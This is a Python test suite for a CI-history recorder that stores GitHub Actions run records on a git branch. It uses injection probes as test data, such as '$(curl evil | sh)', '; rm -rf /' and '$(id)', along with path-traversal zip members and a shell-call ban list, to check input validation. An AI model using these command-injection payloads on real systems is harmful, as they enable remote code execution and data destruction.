"""Host tests for scripts/ci_history.py (ROADMAP §10.9, CI history).

No network and no real `gh`: `Api` is a stub, and remotes are bare
repositories in a temporary directory. Git runs with an empty global
configuration, no system configuration, and `HOME` in the temp dir.
"""

from __future__ import annotations

import base64
import contextlib
import hashlib
import io
import json
import os
import re
import subprocess
import tarfile
import tempfile
import textwrap
import unittest
import zipfile
from collections.abc import Mapping
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any
from unittest import mock

from scripts import check_workflows, ci_history
from scripts.ci_history import ApiError, HistoryError, HistoryRepo, NotRecorded

REPO = "owner/vibeOS"
SHA = "a" * 40
SHA2 = "b" * 40


class StubApi:
    """`json` answers from `routes` (path -> value, or an exception to raise);
    a list endpoint's value is its full item list, paged here as GitHub does."""

    def __init__(
        self,
        routes: Mapping[str, Any] | None = None,
        blobs: Mapping[str, bytes] | None = None,
    ) -> None:
        self.routes: dict[str, Any] = dict(routes or {})
        self.blobs: dict[str, bytes] = dict(blobs or {})
        self.calls: list[tuple[str, dict[str, str | int]]] = []

    def json(self, path: str, params: Mapping[str, str | int] | None = None) -> Any:
        p = dict(params or {})
        self.calls.append((path, p))
        v = self.routes.get(path)
        if callable(v):
            v = v(p)
        if isinstance(v, Exception):
            raise v
        if v is None:
            raise ApiError(path, 404, "Not Found (HTTP 404)")
        if "page" in p:
            page, per = int(p["page"]), int(p["per_page"])
            if isinstance(v, list):
                return v[(page - 1) * per: page * per]
            if isinstance(v, dict):
                for key, items in v.items():
                    if isinstance(items, list):
                        return {**v, key: items[(page - 1) * per: page * per]}
        return v

    def raw(self, path: str, max_bytes: int) -> bytes:
        self.calls.append((path, {}))
        if path not in self.blobs:
            raise ApiError(path, 404, "Not Found (HTTP 404)")
        data = self.blobs[path]
        if len(data) > max_bytes:
            raise ApiError(path, None, "too large")
        return data


def zip_bytes(members: Mapping[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, data in members.items():
            zf.writestr(name, data)
    return buf.getvalue()


def results_file(tier: str = "test-kernel") -> bytes:
    return json.dumps({
        "schema": 1, "commit": SHA, "dirty": False, "arch": "x86_64", "tier": tier,
        "qemu": [], "ktest": {"passed": ["a"], "skipped": [], "failed": []},
        "utest": {"passed": [], "skipped": [], "failed": []},
        "marker": {"passed": [], "failed": []}, "retries": [], "irqoff": [1],
    }).encode()


def runner_file(cpu: str = "AMD EPYC 7763") -> bytes:
    return json.dumps(
        {"schema": 1, "os": "Linux", "arch": "X64", "cpu_model": cpu, "invtsc": True}
    ).encode()


def run_obj(
    run_id: int = 101,
    *,
    workflow: str = "ci",
    event: str = "push",
    branch: str = "main",
    sha: str = SHA,
    head_repo: str = REPO,
    created: str = "2026-03-02T10:00:00Z",
    status: str = "completed",
) -> dict[str, Any]:
    return {
        "id": run_id,
        "name": workflow,
        "path": ci_history.WORKFLOWS[workflow].path,
        "run_attempt": 2,
        "event": event,
        "status": status,
        "head_sha": sha,
        "head_branch": branch,
        "conclusion": "success",
        "created_at": created,
        "run_started_at": created,
        "head_repository": {"full_name": head_repo},
        "actor": {"login": "someone"},
        "triggering_actor": {"login": "someone"},
        "head_commit": {"author": {"name": "A Person", "email": "a@example.com"}},
    }


def plus(ts: str, secs: int) -> str:
    t = datetime.fromisoformat(ts.replace("Z", "+00:00")) + timedelta(seconds=secs)
    return t.strftime("%Y-%m-%dT%H:%M:%SZ")


def job_obj(name: str, created: str, started: str, completed: str) -> dict[str, Any]:
    return {
        "name": name,
        "conclusion": "success",
        "created_at": created,
        "started_at": started,
        "completed_at": completed,
        "steps": [
            {"name": "setup", "conclusion": "success",
             "started_at": started, "completed_at": plus(started, 7)},
            {"name": "skipped one", "conclusion": "skipped",
             "started_at": None, "completed_at": None},
            {"name": "make", "conclusion": "success",
             "started_at": plus(started, 7), "completed_at": completed},
        ],
    }


def run_routes(
    run: dict[str, Any],
    jobs: list[dict[str, Any]] | None = None,
    artifacts: list[dict[str, Any]] | None = None,
) -> dict[str, Any]:
    base = f"/repos/{REPO}/actions/runs/{run['id']}"
    return {
        base: run,
        f"{base}/jobs": {"total_count": len(jobs or []), "jobs": jobs or []},
        f"{base}/artifacts": {"artifacts": artifacts or []},
        f"/repos/{REPO}": {"default_branch": "main"},
    }


def two_jobs() -> list[dict[str, Any]]:
    return [
        job_obj("check", "2026-03-02T10:00:05Z", "2026-03-02T10:00:10Z", "2026-03-02T10:02:00Z"),
        job_obj("tier (x86_64, e2e-1)", "2026-03-02T10:00:06Z", "2026-03-02T10:02:30Z",
                "2026-03-02T10:04:00Z"),
    ]


class GitIsolated(unittest.TestCase):
    """A temp dir, with git isolated from the host's configuration."""

    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.tmp = Path(self._tmp.name)
        gitconfig = self.tmp / "gitconfig"
        gitconfig.write_text("", encoding="utf-8")
        env = {
            "GIT_CONFIG_GLOBAL": str(gitconfig),
            "GIT_CONFIG_NOSYSTEM": "1",
            "HOME": str(self.tmp),
            "GIT_AUTHOR_NAME": "t",
            "GIT_AUTHOR_EMAIL": "t@example.invalid",
            "GIT_COMMITTER_NAME": "t",
            "GIT_COMMITTER_EMAIL": "t@example.invalid",
        }
        patcher = mock.patch.dict(os.environ, env)
        patcher.start()
        for k in ("GITHUB_ACTIONS", "GITHUB_STEP_SUMMARY", "GH_TOKEN"):
            os.environ.pop(k, None)
        self.addCleanup(patcher.stop)
        self.addCleanup(self._tmp.cleanup)
        quiet = mock.patch("sys.stdout", io.StringIO())
        quiet.start()
        self.addCleanup(quiet.stop)
        self.remote = self.tmp / "remote.git"
        self.gitrun("init", "-q", "--bare", str(self.remote), cwd=self.tmp)
        self.sleeps: list[float] = []

    def gitrun(self, *args: str, cwd: Path) -> str:
        r = subprocess.run(
            ["git", "-c", "commit.gpgsign=false", *args],
            cwd=cwd, capture_output=True, text=True, check=True,
        )
        return r.stdout.strip()

    def history(self, name: str = "work", depth: int | None = 1) -> HistoryRepo:
        h = HistoryRepo(self.tmp / name, str(self.remote), sleep=self.sleeps.append)
        h.open(depth=depth)
        return h

    def remote_files(self, ref: str = "ci-history") -> set[str]:
        out = self.gitrun("ls-tree", "-r", "--name-only", ref, cwd=self.remote)
        return set(out.split())

    def remote_show(self, path: str, ref: str = "ci-history") -> Any:
        return json.loads(self.gitrun("show", f"{ref}:{path}", cwd=self.remote))


class TestRecord(unittest.TestCase):
    def test_record_from_stubbed_api(self) -> None:
        run = run_obj()
        api = StubApi(run_routes(run, two_jobs()))
        rec = ci_history.build_record(api, REPO, "ci", 101)
        for k in ("schema", "run_id", "workflow", "event", "head_sha", "branch", "conclusion",
                  "started", "finished", "runner", "jobs", "attempt"):
            self.assertIn(k, rec)
        self.assertEqual(rec["schema"], 1)
        self.assertEqual(rec["run_id"], 101)
        self.assertEqual(rec["head_sha"], SHA)
        self.assertEqual(rec["branch"], "main")
        self.assertEqual(rec["attempt"], 2)
        self.assertEqual(rec["started"], "2026-03-02T10:00:00Z")
        self.assertEqual(rec["finished"], "2026-03-02T10:04:00Z")
        self.assertIsNone(rec["runner"])
        check, tier = rec["jobs"]
        self.assertEqual(check["name"], "check")
        self.assertEqual(check["created"], "2026-03-02T10:00:05Z")
        self.assertEqual(check["seconds"], 110)
        self.assertEqual(tier["seconds"], 90)
        self.assertEqual(
            check["steps"],
            [{"name": "setup", "seconds": 7}, {"name": "skipped one", "seconds": None},
             {"name": "make", "seconds": 103}],
        )
        text = json.dumps(rec).lower()
        for banned in ("actor", "author", "email", "e-mail", "head_commit", "someone"):
            self.assertNotIn(banned, text)
        # jobs are read with filter=latest, paginated
        jobs_calls = [p for path, p in api.calls if path.endswith("/jobs")]
        self.assertEqual(jobs_calls[0]["filter"], "latest")
        self.assertIn("page", jobs_calls[0])

    def test_jobs_paginated(self) -> None:
        jobs = [job_obj(f"j{i}", "2026-03-02T10:00:00Z", "2026-03-02T10:00:00Z",
                        "2026-03-02T10:01:00Z") for i in range(150)]
        api = StubApi(run_routes(run_obj(), jobs))
        rec = ci_history.build_record(api, REPO, "ci", 101)
        self.assertEqual(len(rec["jobs"]), 150)

    def test_commit_input_honoured_only_for_listed_workflow(self) -> None:
        blob = zip_bytes({"commit.json": json.dumps({"schema": 1, "commit": SHA2}).encode()})
        art = [{"id": 9, "name": "commit-input", "size_in_bytes": len(blob), "expired": False}]
        blobs = {f"/repos/{REPO}/actions/artifacts/9/zip": blob}
        # release lists commit_input: the commit is recorded
        rel = run_obj(201, workflow="release", event="workflow_dispatch")
        rec = ci_history.build_record(
            StubApi(run_routes(rel, two_jobs(), art), blobs), REPO, "release", 201
        )
        self.assertEqual(rec["commit"], SHA2)
        # ci does not: the artifact is ignored
        rec = ci_history.build_record(
            StubApi(run_routes(run_obj(), two_jobs(), art), blobs), REPO, "ci", 101
        )
        self.assertNotIn("commit", rec)
        # a pull request, another head repository, or another branch: ignored
        for kw in ({"event": "pull_request"}, {"head_repo": "fork/vibeOS"},
                   {"branch": "topic"}):
            run = run_obj(202, workflow="release", **kw)
            warnings: list[str] = []
            rec = ci_history.build_record(
                StubApi(run_routes(run, two_jobs(), art), blobs), REPO, "release", 202, warnings
            )
            self.assertNotIn("commit", rec, kw)
            self.assertTrue(warnings, kw)

    def test_no_shell_in_tool(self) -> None:
        src = Path(ci_history.__file__).read_text(encoding="utf-8")
        for banned in ("shell=True", "os.system", "os.popen"):
            self.assertNotIn(banned, src)

    def test_rejects_run_of_another_path(self) -> None:
        run = {**run_obj(), "path": ".github/workflows/evil.yml"}
        with self.assertRaises(HistoryError):
            ci_history.build_record(StubApi(run_routes(run, two_jobs())), REPO, "ci", 101)

    def test_tombstone_fields(self) -> None:
        t = ci_history.tombstone(run_obj(), "ci", "jobs API returned 410")
        self.assertEqual(t["jobs"], [])
        self.assertEqual(t["tombstone"], "jobs API returned 410")
        self.assertTrue(ci_history.valid_record(t, "ci", 101))
        self.assertNotIn("actor", json.dumps(t))


class TestEvent(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.path = Path(self._tmp.name) / "event.json"

    def event(self, **run: Any) -> Path:
        wr: dict[str, Any] = {
            "id": 555,
            "name": "ci",
            "path": ".github/workflows/ci.yml",
            "head_branch": "$(curl evil | sh)",
            "display_title": "`; rm -rf / #",
            "head_sha": "not-a-sha",
            "head_commit": {"message": "$(id)"},
        }
        wr.update(run)
        self.path.write_text(
            json.dumps({"workflow_run": wr, "repository": {"full_name": REPO}}),
            encoding="utf-8",
        )
        return self.path

    def test_event_reads_only_run_id(self) -> None:
        self.assertEqual(ci_history.load_event(self.event(), REPO), ("ci", 555))
        self.assertEqual(
            ci_history.load_event(
                self.event(name="release", path=".github/workflows/release.yml"), REPO
            ),
            ("release", 555),
        )
        self.assertEqual(
            ci_history.load_event(
                self.event(name="nightly", path=".github/workflows/nightly.yml"), REPO
            ),
            ("nightly", 555),
        )
        self.assertEqual(
            ci_history.load_event(
                self.event(name="macos", path=".github/workflows/macos.yml"), REPO
            ),
            ("macos", 555),
        )

    def test_event_rejects_unlisted_workflow(self) -> None:
        with self.assertRaises(NotRecorded):
            ci_history.load_event(
                self.event(name="fuzz", path=".github/workflows/fuzz.yml"), REPO
            )
        with self.assertRaises(NotRecorded):
            ci_history.load_event(self.event(), "someone/else")

    def test_event_rejects_other_path(self) -> None:
        # a fork's second workflow that calls itself `ci`
        with self.assertRaises(NotRecorded):
            ci_history.load_event(self.event(path=".github/workflows/ci2.yml"), REPO)

    def test_event_rejects_non_integer_id(self) -> None:
        for bad in ("555", 5.5, None, True, -1, 0, "555; rm -rf /"):
            with self.assertRaises(HistoryError, msg=repr(bad)):
                ci_history.load_event(self.event(id=bad), REPO)

    def test_main_notice_for_unlisted_run(self) -> None:
        path = self.event(name="other", path=".github/workflows/other.yml")
        with mock.patch.dict(os.environ, {"GITHUB_REPOSITORY": REPO}), \
                mock.patch.object(ci_history, "GhApi") as gh, \
                mock.patch("sys.stdout", io.StringIO()):
            self.assertEqual(ci_history.main(["--event", str(path)]), 0)
            gh.assert_not_called()


class TestArtifacts(unittest.TestCase):
    def build(self, arts: list[dict[str, Any]], blobs: dict[str, bytes],
              jobs: list[dict[str, Any]] | None = None) -> tuple[dict[str, Any], list[str]]:
        warnings: list[str] = []
        routes = run_routes(run_obj(), two_jobs() if jobs is None else jobs, arts)
        self.api = StubApi(routes, blobs)
        rec = ci_history.build_record(self.api, REPO, "ci", 101, warnings)
        return rec, warnings

    @staticmethod
    def art(aid: int, name: str, blob: bytes, size: int | None = None) -> dict[str, Any]:
        return {"id": aid, "name": name, "expired": False,
                "size_in_bytes": len(blob) if size is None else size}

    @staticmethod
    def url(aid: int) -> str:
        return f"/repos/{REPO}/actions/artifacts/{aid}/zip"

    def test_slug(self) -> None:
        self.assertEqual(ci_history.slug("tier (x86_64, e2e-1)"), "tier-x86-64-e2e-1")
        self.assertEqual(ci_history.slug("Check"), "check")
        self.assertEqual(ci_history.slug("a -- b"), "a-b")

    def test_results_attached_by_slug(self) -> None:
        blob = zip_bytes({"x86_64-test-e2e.json": results_file("test-e2e")})
        chk = zip_bytes({"x86_64-adhoc.json": results_file("adhoc")})
        other = zip_bytes({"a.json": results_file()})
        rec, warnings = self.build(
            [self.art(1, "results-x86_64-e2e-1", blob), self.art(2, "results-check", chk),
             self.art(3, "prebuilt-x86_64", other), self.art(4, "results-nomatch", other)],
            {self.url(1): blob, self.url(2): chk, self.url(3): other, self.url(4): other},
        )
        check, tier = rec["jobs"]
        self.assertEqual([r["tier"] for r in tier["results"]], ["test-e2e"])
        self.assertEqual([r["tier"] for r in check["results"]], ["adhoc"])
        self.assertEqual(tier["results"][0]["irqoff"], [1])  # unknown keys kept
        self.assertNotIn("_path", tier["results"][0])
        self.assertTrue(any("results-nomatch" in w for w in warnings))
        # prebuilt-* is never downloaded
        self.assertNotIn(self.url(3), [path for path, _ in self.api.calls])
        # one job only: an unmatched artifact goes to it
        rec, _ = self.build([self.art(4, "results-nomatch", other)], {self.url(4): other},
                            jobs=two_jobs()[:1])
        self.assertEqual(len(rec["jobs"][0]["results"]), 1)

    def test_workflow_prefixed_tokens(self) -> None:
        # macos.yml uploads results-x86_64-macos-<job> from its check and test jobs
        def record(workflow: str) -> dict[str, Any]:
            jobs = [ci_history.job_entry({"name": n}) for n in ("check", "test")]
            return {"workflow": workflow, "jobs": jobs}

        arts = ci_history.Artifacts(results={"x86_64-macos-check": [{"tier": "c"}],
                                             "x86_64-macos-test": [{"tier": "t"}]})
        rec = record("macos")
        ci_history.attach_artifacts(rec, arts)
        self.assertEqual([j["results"] for j in rec["jobs"]], [[{"tier": "c"}], [{"tier": "t"}]])
        self.assertEqual(arts.warnings, [])
        # the prefix is the run's own workflow key, not any key
        arts = ci_history.Artifacts(results={"x86_64-macos-check": [{"tier": "c"}]})
        rec = record("nightly")
        ci_history.attach_artifacts(rec, arts)
        self.assertEqual([j["results"] for j in rec["jobs"]], [[], []])
        self.assertEqual(len(arts.warnings), 1)

    def test_runner_parsed_per_job(self) -> None:
        good = zip_bytes({"runner.json": runner_file()})
        bad = zip_bytes({"runner.json": json.dumps(
            {"schema": 1, "os": "L", "arch": "X", "cpu_model": "x" * 201, "invtsc": True}
        ).encode()})
        rec, warnings = self.build(
            [self.art(1, "runner-x86_64-e2e-1", good), self.art(2, "runner-check", bad)],
            {self.url(1): good, self.url(2): bad},
        )
        check, tier = rec["jobs"]
        self.assertEqual(tier["runner"]["cpu_model"], "AMD EPYC 7763")
        self.assertIsNone(check["runner"])
        self.assertEqual(rec["runner"], tier["runner"])  # exactly one job has one
        self.assertTrue(warnings)
        both = zip_bytes({"runner.json": runner_file("Intel Xeon")})
        rec, _ = self.build(
            [self.art(1, "runner-x86_64-e2e-1", good), self.art(2, "runner-check", both)],
            {self.url(1): good, self.url(2): both},
        )
        self.assertIsNone(rec["runner"])  # two jobs have one
        self.assertEqual(rec["jobs"][0]["runner"]["cpu_model"], "Intel Xeon")
        self.assertIsNone(ci_history.parse_runner({"schema": 2}))
        self.assertIsNone(ci_history.parse_runner(
            {"schema": 1, "os": "L", "arch": "X", "cpu_model": "c", "invtsc": "yes"}))

    def test_untrusted_artifact_limits(self) -> None:
        blob = zip_bytes({"r.json": results_file()})
        huge_member = zip_bytes({"r.json": b" " * (ci_history.MAX_MEMBER_BYTES + 1)})
        traversal = zip_bytes({"../../escape.json": results_file(),
                               "/abs/escape.json": results_file()})
        bad_json = zip_bytes({"r.json": b"{not json"})
        not_zip = b"PK\x03\x04garbage"
        cwd = Path.cwd()
        with tempfile.TemporaryDirectory() as tmp:
            os.chdir(tmp)
            try:
                rec, warnings = self.build(
                    [
                        self.art(1, "results-x86_64-e2e-1", blob,
                                 size=ci_history.MAX_ARTIFACT_BYTES + 1),
                        self.art(2, "results-check", huge_member),
                        self.art(3, "results-x86_64-e2e-1", traversal),
                        self.art(4, "results-check", bad_json),
                        self.art(5, "results-check", not_zip),
                    ],
                    {self.url(1): blob, self.url(2): huge_member, self.url(3): traversal,
                     self.url(4): bad_json, self.url(5): not_zip},
                )
                self.assertEqual(os.listdir(tmp), [])
            finally:
                os.chdir(cwd)
        self.assertFalse(Path(tempfile.gettempdir(), "escape.json").exists())
        check, tier = rec["jobs"]
        # the oversize artifact was never downloaded; the traversal members
        # were read in memory under fresh names
        self.assertEqual(len(tier["results"]), 2)
        self.assertEqual(check["results"], [])
        self.assertGreaterEqual(len(warnings), 4)
        # a download larger than it was listed is refused by the capped reader
        big = b"x" * 64
        rec, warnings = self.build(
            [self.art(6, "results-check", big, size=10)], {self.url(6): big}
        )
        self.assertEqual(rec["jobs"][0]["results"], [])


class TestWriter(GitIsolated):
    def test_bootstrap_creates_orphan_branch(self) -> None:
        h = self.history()
        sha = h.commit_files({"runs/ci/1.json": b"{}\n"}, "ci run 1")
        self.assertIsNotNone(sha)
        self.assertEqual(self.remote_files(), {"runs/ci/1.json"})
        parents = self.gitrun("rev-list", "--parents", "-n1", "ci-history", cwd=self.remote)
        self.assertEqual(len(parents.split()), 1)  # a root commit
        branches = self.gitrun("for-each-ref", "--format=%(refname)", cwd=self.remote)
        self.assertEqual(branches.split(), ["refs/heads/ci-history"])
        author = self.gitrun("log", "-1", "--format=%an <%ae>", "ci-history", cwd=self.remote)
        self.assertEqual(author, f"{ci_history.BOT_NAME} <{ci_history.BOT_EMAIL}>")

    def test_one_file_per_run_id(self) -> None:
        h = self.history()
        first = {**ci_history.tombstone(run_obj(7), "ci", "x"), "attempt": 1}
        h.commit_files({ci_history.record_path("ci", 7): ci_history.encode(first)}, "ci run 7")
        h2 = self.history("work2")
        second = {**first, "attempt": 2}
        h2.commit_files({ci_history.record_path("ci", 7): ci_history.encode(second)}, "ci run 7")
        self.assertEqual(self.remote_files(), {"runs/ci/7.json"})
        self.assertEqual(self.remote_show("runs/ci/7.json")["attempt"], 2)
        # the same bytes again: nothing to commit
        self.assertIsNone(h2.commit_files(
            {ci_history.record_path("ci", 7): ci_history.encode(second)}, "ci run 7"))
        self.assertTrue(h2.has("ci", 7))
        self.assertFalse(h2.has("ci", 8))
        with self.assertRaises(HistoryError):
            ci_history.record_path("../x", 1)
        with self.assertRaises(HistoryError):
            h2.commit_files({"../x.json": b"{}"}, "bad")

    def test_concurrent_writers_lose_no_record(self) -> None:
        self.history("seed").commit_files({"runs/ci/1.json": b"{}\n"}, "ci run 1")
        a = self.history("a")
        b = self.history("b")  # both read the same tip
        a.commit_files({"runs/ci/2.json": b"{}\n"}, "ci run 2")
        b.commit_files({"runs/ci/3.json": b"{}\n"}, "ci run 3")  # rejected, re-applied
        self.assertEqual(self.remote_files(),
                         {"runs/ci/1.json", "runs/ci/2.json", "runs/ci/3.json"})
        self.assertEqual(len(self.sleeps), 1)
        self.assertTrue(1.0 <= self.sleeps[0] <= 5.0)
        log = self.gitrun("log", "--format=%s", "ci-history", cwd=self.remote).split("\n")
        self.assertEqual(log, ["ci run 3", "ci run 2", "ci run 1"])

    def test_concurrent_bootstrap(self) -> None:
        a = self.history("a")
        b = self.history("b")  # neither sees a branch
        a.commit_files({"runs/ci/1.json": b"{}\n"}, "ci run 1")
        b.commit_files({"runs/ci/2.json": b"{}\n"}, "ci run 2")
        self.assertEqual(self.remote_files(), {"runs/ci/1.json", "runs/ci/2.json"})

    def test_open_fails_without_remote(self) -> None:
        h = HistoryRepo(self.tmp / "w", str(self.tmp / "missing.git"), sleep=self.sleeps.append)
        with self.assertRaises(HistoryError):
            h.open()

    def test_retry_after_restart(self) -> None:
        seed = self.history("seed")
        seed.commit_files({"runs/ci/1.json": b"{}\n", "runs/ci/2.json": b"{}\n"}, "old")
        w = self.history("w")  # reads the pre-rotation tip
        # a rotation restarts the branch from an orphan commit without run 1
        r = self.tmp / "rot"
        self.gitrun("clone", "-q", "--branch", "ci-history", str(self.remote), str(r),
                    cwd=self.tmp)
        self.gitrun("checkout", "-q", "--orphan", "fresh", cwd=r)
        self.gitrun("rm", "-q", "--cached", "runs/ci/1.json", cwd=r)
        (r / "runs/ci/1.json").unlink()
        (r / "archives.json").write_text('{"schema": 1, "archives": []}\n')
        self.gitrun("add", "archives.json", cwd=r)
        self.gitrun("commit", "-q", "-m", "rotate", cwd=r)
        root = self.gitrun("rev-parse", "HEAD", cwd=r)
        self.gitrun("push", "-q", "-f", "origin", "HEAD:refs/heads/ci-history", cwd=r)
        w.commit_files({"runs/ci/3.json": b"{}\n"}, "ci run 3")
        self.assertEqual(self.remote_files(),
                         {"runs/ci/2.json", "runs/ci/3.json", "archives.json"})
        parents = self.gitrun("rev-list", "--parents", "-n1", "ci-history",
                              cwd=self.remote).split()
        self.assertEqual(parents[1:], [root])


class TestFallbackCredentials(GitIsolated):
    """The job-token header `open` gives a clone in CI when git has no helper.
    The token is a fake; no test prints one."""

    TOKEN = "fake-token-not-a-secret"

    def headers(self, workdir: Path) -> list[str]:
        r = subprocess.run(
            ["git", "-C", str(workdir), "config", "--local", "--get-all",
             ci_history.EXTRAHEADER],
            capture_output=True, text=True, check=False,
        )
        return r.stdout.splitlines()

    def open_in_ci(self, name: str) -> list[list[str]]:
        """Open the history in `name` as a CI job would, returning every
        subprocess argv the open ran."""
        argvs: list[list[str]] = []
        real_run = subprocess.run

        def spy(argv: Any, *a: Any, **kw: Any) -> Any:
            argvs.append([str(x) for x in argv])
            return real_run(argv, *a, **kw)

        with (
            mock.patch.dict(os.environ, {"GITHUB_ACTIONS": "true", "GH_TOKEN": self.TOKEN}),
            mock.patch.object(subprocess, "run", spy),
        ):
            self.history(name)
        return argvs

    def test_reopened_work_tree_holds_one_header(self) -> None:
        # `make ci-budget` opens one work tree for --budget, then for --tiers:
        # two headers made GitHub answer `Duplicate header: "Authorization"`.
        self.history("seed").commit_files({"runs/ci/1.json": b"{}\n"}, "ci run 1")
        argvs = self.open_in_ci("w") + self.open_in_ci("w")
        cred = base64.b64encode(f"x-access-token:{self.TOKEN}".encode()).decode()
        got = self.headers(self.tmp / "w")
        self.assertEqual(len(got), 1, "one Authorization header after two opens")
        self.assertTrue(got[0] == f"AUTHORIZATION: basic {cred}", "the job token's header")
        # never on argv
        for argv in argvs:
            self.assertFalse(any(self.TOKEN in x or cred in x for x in argv), argv[:4])

    def test_no_header_outside_ci_or_with_a_helper(self) -> None:
        self.history("plain")
        self.assertEqual(self.headers(self.tmp / "plain"), [])
        self.gitrun("config", "--global", "credential.helper", "store", cwd=self.tmp)
        self.open_in_ci("helper")
        self.assertEqual(self.headers(self.tmp / "helper"), [])


NOW = datetime(2026, 4, 15, tzinfo=UTC)
LANDED = "2026-03-01T12:00:00Z"
LANDING_SHA = "c" * 40


class ApiWorld:
    """The runs, commits and jobs the stub API serves for the completeness
    check and the backfill."""

    def __init__(self) -> None:
        self.runs: list[dict[str, Any]] = []
        self.jobs: dict[int, Any] = {}
        self.descendants: set[str] = set()
        self.landed = True

    def add(self, run: dict[str, Any], jobs: Any = None) -> dict[str, Any]:
        self.runs.append(run)
        self.jobs[run["id"]] = two_jobs() if jobs is None else jobs
        return run

    def list_runs(self, p: Mapping[str, str | int]) -> dict[str, Any]:
        lo, hi = str(p["created"]).split("..")
        assert p["branch"] == "main"
        out = [r for r in self.runs if lo <= r["created_at"][:10] <= hi]
        out.sort(key=lambda r: r["created_at"], reverse=True)
        return {"total_count": len(out), "workflow_runs": out}

    def api(self) -> StubApi:
        routes: dict[str, Any] = {
            f"/repos/{REPO}": {"default_branch": "main"},
            f"/repos/{REPO}/actions/workflows/ci.yml": {"created_at": "2025-11-20T00:00:00Z"},
            f"/repos/{REPO}/actions/workflows/ci.yml/runs": self.list_runs,
            f"/repos/{REPO}/commits": [
                {"sha": "d" * 40, "commit": {"committer": {"date": "2026-03-20T00:00:00Z"}}},
                {"sha": LANDING_SHA, "commit": {"committer": {"date": LANDED}}},
            ] if self.landed else [],
        }
        for r in self.runs:
            base = f"/repos/{REPO}/actions/runs/{r['id']}"
            routes[base] = r
            j = self.jobs[r["id"]]
            routes[f"{base}/jobs"] = j if isinstance(j, Exception) else {"jobs": j}
            routes[f"{base}/artifacts"] = {"artifacts": []}
            status = "ahead" if r["head_sha"] in self.descendants else "diverged"
            routes[f"/repos/{REPO}/compare/{LANDING_SHA}...{r['head_sha']}"] = {"status": status}
        return StubApi(routes)


class TestComplete(GitIsolated):
    def setUp(self) -> None:
        super().setUp()
        self.world = ApiWorld()
        self.h = self.history()

    def check(self, gated: str | None = None, needed: set[str] | None = None) -> list[str]:
        return ci_history.check_complete(
            self.world.api(), REPO, self.h, gated, needed or set(), now=NOW
        )

    def put(self, rec: dict[str, Any]) -> None:
        self.h.commit_files(
            {ci_history.record_path(rec["workflow"], rec["run_id"]): ci_history.encode(rec)},
            "put",
        )

    def full(self, run: dict[str, Any]) -> dict[str, Any]:
        return {**ci_history.run_fields(run, "ci"), "jobs": [{"name": "check"}]}

    def test_missing_main_run_fails(self) -> None:
        a = self.world.add(run_obj(301, sha=SHA, created="2026-03-05T00:00:00Z"))
        self.world.add(run_obj(302, sha=SHA2, created="2026-04-02T00:00:00Z"))
        self.world.descendants |= {SHA, SHA2}
        self.put(self.full(a))
        problems = self.check()
        self.assertEqual(len(problems), 1)
        self.assertIn("run 302", problems[0])
        # the landing is unknown before the workflow lands: nothing to check
        self.world.landed = False
        self.assertEqual(self.check(), [])

    def test_pre_landing_runs_ignored(self) -> None:
        # created before the landing commit's date, or not a descendant of it
        self.world.add(run_obj(311, sha=SHA, created="2026-02-10T00:00:00Z"))
        self.world.add(run_obj(312, sha=SHA2, created="2026-03-10T00:00:00Z"))
        self.world.descendants |= {SHA}
        api = self.world.api()
        self.assertEqual(
            ci_history.check_complete(api, REPO, self.h, None, set(), now=NOW), []
        )
        compares = [p for p, _ in api.calls if "/compare/" in p]
        self.assertEqual(compares, [f"/repos/{REPO}/compare/{LANDING_SHA}...{SHA2}"])

    def test_pull_request_runs_ignored(self) -> None:
        self.world.descendants |= {SHA}
        self.world.add(run_obj(321, event="pull_request", created="2026-03-10T00:00:00Z"))
        # a fork's pull request from its own `main`
        self.world.add(run_obj(322, event="pull_request", head_repo="fork/vibeOS",
                               created="2026-03-10T00:00:00Z"))
        self.world.add(run_obj(323, head_repo="fork/vibeOS", created="2026-03-10T00:00:00Z"))
        self.world.add(run_obj(324, branch="topic", created="2026-03-10T00:00:00Z"))
        self.world.add(run_obj(325, status="in_progress", created="2026-03-10T00:00:00Z"))
        self.assertEqual(self.check(), [])
        self.world.add(run_obj(326, event="workflow_dispatch", created="2026-03-10T00:00:00Z"))
        self.assertEqual(len(self.check()), 1)

    def test_tombstone_accepted(self) -> None:
        run = self.world.add(run_obj(331, created="2026-03-10T00:00:00Z"))
        self.world.descendants |= {SHA}
        self.put(ci_history.tombstone(run, "ci", "the jobs API returned 410"))
        self.assertEqual(self.check(), [])
        # a gate names ci, but the tombstoned run is not the gated commit's
        self.assertEqual(self.check(gated=SHA2, needed={"ci"}), [])

    def test_tombstone_rejected_when_gate_needs_run(self) -> None:
        gates = self.tmp / "gates"
        gates.mkdir()
        (gates / "phase-10.toml").write_text(textwrap.dedent("""\
            [[line]]
            key = "exit gate"
            [[line.entry]]
            job = {workflow = "ci", job = "check"}
            [[line.entry]]
            cmd = "make check"
        """), encoding="utf-8")
        (gates / "phase-10-needs.toml").write_text("[[box]]\n", encoding="utf-8")
        needed = ci_history.gate_job_entries(gates)
        self.assertEqual(needed, {"ci"})
        run = self.world.add(run_obj(341, created="2026-03-10T00:00:00Z"))
        self.world.descendants |= {SHA}
        self.put(ci_history.tombstone(run, "ci", "the jobs API returned 404"))
        problems = self.check(gated=SHA, needed=needed)
        self.assertEqual(len(problems), 1)
        self.assertIn("tombstone", problems[0])
        # no gate names ci: accepted
        self.assertEqual(self.check(gated=SHA, needed=set()), [])
        # a full, successful record proves the same commit: accepted
        again = self.world.add(run_obj(342, created="2026-03-11T00:00:00Z"))
        self.put(self.full(again))
        self.assertEqual(self.check(gated=SHA, needed=needed), [])

    def test_gate_job_entries(self) -> None:
        gates = self.tmp / "g"
        self.assertEqual(ci_history.gate_job_entries(gates), set())
        gates.mkdir()
        (gates / "common.toml").write_text(
            '[[line]]\nkey = "k"\n[[line.entry]]\njob = {workflow = "release.yml", job = "b"}\n',
            encoding="utf-8",
        )
        (gates / "phase-11.toml").write_text(
            '[[line]]\nkey = "k"\n[[line.entry]]\njob = {workflow = "ci.yml", job = "b"}\n',
            encoding="utf-8",
        )
        self.assertEqual(ci_history.gate_job_entries(gates), {"ci", "release"})
        (gates / "phase-12.toml").write_text("not = [toml", encoding="utf-8")
        with self.assertRaises(HistoryError):
            ci_history.gate_job_entries(gates)

